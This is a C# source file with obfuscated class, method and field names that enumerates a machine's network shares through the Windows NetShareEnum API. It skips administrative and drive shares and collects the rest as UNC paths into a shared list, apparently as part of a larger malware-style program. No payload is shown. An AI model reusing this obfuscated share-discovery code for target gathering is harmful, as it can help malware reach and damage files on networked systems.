using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace PbjBzLsVOvNrzQ;

public class GaRaALUtLCoXMszwQ
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct rGsVWVWLHqQ
	{
		public string MLNSWDizReqUF;

		public uint HDnBGSDFet;

		public string cKePbOzyfVZqh;

		public rGsVWVWLHqQ(string sharename, uint sharetype, string remark)
		{
			MLNSWDizReqUF = sharename;
			HDnBGSDFet = sharetype;
			cKePbOzyfVZqh = remark;
		}

		public override string ToString()
		{
			return MLNSWDizReqUF;
		}
	}

	private enum VwHUoEApxVfmXc : uint
	{
		uoHEjlupYjGfefy = 0u,
		dRPhlncbyGISY = 2100u,
		OAUHqHmEXLChHVY = 2116u,
		mjRXOKvrhXqUsG = 2118u,
		KKyvvtBXMYsOAFl = 2123u
	}

	private enum EeiPGzwyHdpvbt : uint
	{
		ZSRVqyuJWZO = 0u,
		XxGEJCgztWy = 1u,
		WXsnxfULMyKUL = 2u,
		HikvfOjKmxuXiJj = 3u,
		KFqyejfuBAQv = 2147483648u
	}

	private const uint JEgaHrzsSnXKYz = uint.MaxValue;

	private const int uoHEjlupYjGfefy = 0;

	public rGsVWVWLHqQ[] ASOYEMgyutydo(string cXGHcHnJPkiocxpX)
	{
		List<rGsVWVWLHqQ> list = new List<rGsVWVWLHqQ>();
		int JwZKcNIDdYU = 0;
		int pOEnUAWdhCTG = 0;
		int fAxMFnnKyGMWW = 0;
		int num = Marshal.SizeOf(typeof(rGsVWVWLHqQ));
		IntPtr VIEXkBTacJFYok = IntPtr.Zero;
		StringBuilder oRzEriLJxyIJaM = new StringBuilder(cXGHcHnJPkiocxpX);
		int num2 = NetShareEnum(oRzEriLJxyIJaM, 1, ref VIEXkBTacJFYok, uint.MaxValue, ref JwZKcNIDdYU, ref pOEnUAWdhCTG, ref fAxMFnnKyGMWW);
		if (num2 == 0)
		{
			IntPtr ptr = VIEXkBTacJFYok;
			for (int i = 0; i < JwZKcNIDdYU; i++)
			{
				rGsVWVWLHqQ item = (rGsVWVWLHqQ)Marshal.PtrToStructure(ptr, typeof(rGsVWVWLHqQ));
				list.Add(item);
				ptr += num;
			}
			NetApiBufferFree(VIEXkBTacJFYok);
			return list.ToArray();
		}
		list.Add(new rGsVWVWLHqQ("ERROR=" + num2, 10u, string.Empty));
		return list.ToArray();
	}

	[DllImport("Netapi32.dll", SetLastError = true)]
	private static extern int NetApiBufferFree(IntPtr dOlSGnTYHs);

	[DllImport("Netapi32.dll", CharSet = CharSet.Unicode)]
	private static extern int NetShareEnum(StringBuilder ORzEriLJxyIJaM, int PkfLgyqXopD, ref IntPtr VIEXkBTacJFYok, uint JaaJvkUNDdnHqVq, ref int JwZKcNIDdYU, ref int pOEnUAWdhCTG, ref int fAxMFnnKyGMWW);

	public static void SmfLekvGDXY()
	{
		try
		{
			string[] logicalDrives = Directory.GetLogicalDrives();
			rGsVWVWLHqQ[] array = new GaRaALUtLCoXMszwQ().ASOYEMgyutydo(Environment.MachineName);
			rGsVWVWLHqQ[] array2 = array;
			for (int i = 0; i < array2.Length; i++)
			{
				rGsVWVWLHqQ rGsVWVWLHqQ = array2[i];
				if (rGsVWVWLHqQ.ToString().Contains("ADMIN$") || rGsVWVWLHqQ.ToString().Contains("User") || rGsVWVWLHqQ.ToString().Contains("IPC$") || logicalDrives.Contains(rGsVWVWLHqQ.ToString().Replace("$", ":\\")))
				{
					continue;
				}
				oIxRFVSIpmRuMqIJ.xdynXtEYQwd.Add("\\\\" + Environment.MachineName + "\\" + rGsVWVWLHqQ);
				if (oIxRFVSIpmRuMqIJ.QPmKNZZswIrG)
				{
					try
					{
						Console.WriteLine("Share Added: {0}", "\\\\" + Environment.MachineName + "\\" + rGsVWVWLHqQ);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		catch (Exception ex2)
		{
			if (oIxRFVSIpmRuMqIJ.TQcDMEBrjpu)
			{
				try
				{
					File.AppendAllText(oIxRFVSIpmRuMqIJ.lNABZjYJLaAdehz, "Error while enumerating shares: " + ex2.Message);
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
